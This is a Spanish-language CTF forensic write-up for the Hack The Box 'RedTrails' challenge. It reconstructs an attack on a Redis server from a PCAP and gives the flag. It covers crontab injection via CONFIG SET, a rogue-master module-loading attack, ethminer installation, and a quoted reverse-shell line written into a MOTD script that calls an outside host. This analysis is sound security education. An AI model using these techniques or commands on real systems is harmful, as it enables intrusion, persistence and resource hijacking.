# RedTrails - Análisis Forense de Ataque a Redis

## Resumen

Análisis forense de un ataque a una instancia Redis 7.2.1 protegida por contraseña. El atacante (10.10.0.15) comprometió el servidor Redis (10.10.0.90) usando dos técnicas distintas y desplegó un cryptominer (ethminer).

## Flag

```
HTB{r3d15_1n574nc35_c0uld_0p3n_n3w_un3xp3c73d_7r41l5!}
```

La flag se compone de tres partes encontradas en diferentes ubicaciones del PCAP:
1. `HTB{r3d15_1n574nc35` — Dentro de una clave SSH pública inyectada via script bash
2. `_c0uld_0p3n_n3w` — En la base de datos Redis, campo `henry6159:email` de la tabla `users_table`
3. `_un3xp3c73d_7r41l5!}` — En la variable de entorno `FLAG_PART` del servidor comprometido, visible en la salida cifrada del comando de instalación de ethminer

## Información del Entorno

- **Víctima (Redis Server):** 10.10.0.90, puerto 6379
- **Atacante:** 10.10.0.15
- **Servidor C2/Malware:** 10.10.0.50 (files.pypi-install.com)
- **Redis Version:** 7.2.1
- **OS:** Linux redis-master 5.15.0-88-generic (Ubuntu)
- **Contraseña Redis:** 1943567864

## Cronología del Ataque

### Fase 1: Reconocimiento y Escritura de Crontabs (t=0.0s - 0.5s)

Stream TCP 0 — El atacante se autentica y enumera la base de datos:

1. `AUTH 1943567864` — Autenticación exitosa
2. `COMMAND DOCS` — Enumera comandos disponibles
3. `INFO` — Obtiene información del servidor (versión, OS, etc.)
4. `KEYS *` — Lista todas las claves
5. `TYPE users_table` → hash
6. `HGETALL users_table` — Extrae toda la tabla de usuarios (hashes MD5 de contraseñas)

Luego ejecuta el ataque clásico de Redis Crontab RCE:

7. `CONFIG SET DIR /var/spool/cron` — Cambia directorio de trabajo
8. `CONFIG SET DBFILENAME root` — Nombre del archivo de dump
9. `SET TY1RI8` — Crontab: wget + bash desde files.pypi-install.com
10. `SET EJHIPI` — Crontab: curl + bash (respaldo)
11. `SET MBW89Y` — Crontab: lynx + bash (respaldo)
12. `SAVE` — Escribe el archivo crontab
13. `CONFIG SET DIR /var/spool/cron/crontabs` — También en crontabs/
14. `SAVE`

### Fase 2: Descarga de Script Malicioso (t=11.5s)

La crontab se activa y el servidor Redis descarga un script bash ofuscado:
- `GET /packages/VgLy8V0Zxo` desde `http://files.pypi-install.com`

El script está ofuscado usando:
- Cadena base64 invertida (`rev | base64 -d`)
- Variables fragmentadas para ocultar los comandos

### Fase 3: Ataque Redis Rogue Server / Module Loading (t=24.2s - 28.8s)

Stream TCP 2 — Segunda fase usando Redis Master-Slave Replication Attack:

1. `AUTH 1943567864` — Re-autenticación
2. `SLAVEOF 10.10.0.15 6379` — Configura la víctima como esclavo del atacante
3. `CONFIG SET DIR /data`
4. `CONFIG SET dbfilename x10SPFHN.so` — Nombre del módulo malicioso
5. El atacante actúa como master Redis y envía un archivo .so vía FULLRESYNC
6. `MODULE LOAD ./x10SPFHN.so` — Carga el módulo malicioso
7. `SLAVEOF NO ONE` — Deshace la replicación
8. `CONFIG SET dbfilename dump.rdb` — Restaura el nombre original

### Fase 4: Ejecución Remota de Comandos (t=28.8s - 43.5s)

Usando el módulo cargado que registra el comando `system.exec`:

1. `system.exec rm -v ./x10SPFHN.so` — Elimina el módulo del disco
2. `system.exec uname -a` — Reconocimiento del sistema
3. `system.exec wget ... && bash gezsdSC8i3` — Descarga e instala ethminer (cryptominer)
4. `MODULE UNLOAD system` — Descarga el módulo de memoria

### Fase 5: Persistencia

El script bash decodificado contiene dos mecanismos de persistencia:

1. **Reverse Shell via MOTD:**
   ```bash
   echo 'bash -c "bash -i >& /dev/tcp/10.10.0.200/1337 0>&1"' > /etc/update-motd.d/00-header
   ```

2. **SSH Backdoor:**
   Inyecta una clave SSH pública del atacante en `~/.ssh/authorized_keys`

## Análisis del Módulo Malicioso (.so)

- **Tipo:** ELF 64-bit LSB shared object, x86-64, stripped
- **Funcionalidad:** Registra el comando Redis `system.exec` que ejecuta comandos via `popen()`
- **Cifrado de salida:** AES-256-CBC
  - **Clave:** `h02B6aVgu09Kzu9QTvTOtgx9oER9WIoz`
  - **IV:** `YDP7ECjzuV7sagMN`

Las respuestas de `system.exec` se cifran con AES-256-CBC antes de enviarse al atacante, lo que dificulta la detección por IDS/IPS.

## Datos Exfiltrados

### Tabla de Usuarios

| Usuario | Hash MD5 | Email |
|---------|----------|-------|
| alice7185 | 6ccd3011eba1f7f0cb6e6143c40580e1 | alice7185@htb.local |
| bob9862 | 8baea79cb48a8ed8247cce03f6b1ab14 | bob9862@htb.local |
| charlie4371 | a2a789021839be8f458b49ffd107558a | charlie4371@htb.local |
| david5014 | f059fc5d167f597a91c48041dea1460a | david5014@htb.local |
| emma1716 | d7df8cffd58ec406c74116a33afd3cc7 | emma1716@htb.local |
| frank2180 | 4fe3d40556cd5fe47872053f2f2818b1 | frank2180@htb.local |
| grace8972 | f2d9e78f6c3717c9bfb3507e95074189 | grace8972@htb.local |
| henry6159 | afb04edbeda01e437c644e84c1d539eb | **FLAG_PART: _c0uld_0p3n_n3w** |
| ivy7948 | 70fde9bb12772a894ac7b51fe78f1da2 | ivy7948@htb.local |
| jack3908 | 9f791d0427c8a5e299fceffb20205492 | jack3908@htb.local |

## Técnicas MITRE ATT&CK

| Técnica | ID | Descripción |
|---------|-----|-------------|
| Exploit Public-Facing Application | T1190 | Abuso de Redis con credenciales débiles |
| Scheduled Task/Job: Cron | T1053.003 | Escritura de crontabs maliciosos |
| Server Software Component | T1505 | Carga de módulo Redis malicioso (.so) |
| Command and Scripting Interpreter: Unix Shell | T1059.004 | Ejecución de bash scripts |
| Obfuscated Files or Information | T1027 | Script bash ofuscado (base64 + rev) |
| Account Manipulation: SSH Authorized Keys | T1098.004 | Inyección de clave SSH |
| Boot or Logon Initialization Scripts | T1037 | Reverse shell via MOTD |
| Resource Hijacking | T1496 | Instalación de ethminer (cryptomining) |
| Encrypted Channel | T1573 | Comunicación cifrada AES-256-CBC en respuestas |
| Data from Information Repositories | T1213 | Exfiltración de tabla de usuarios |
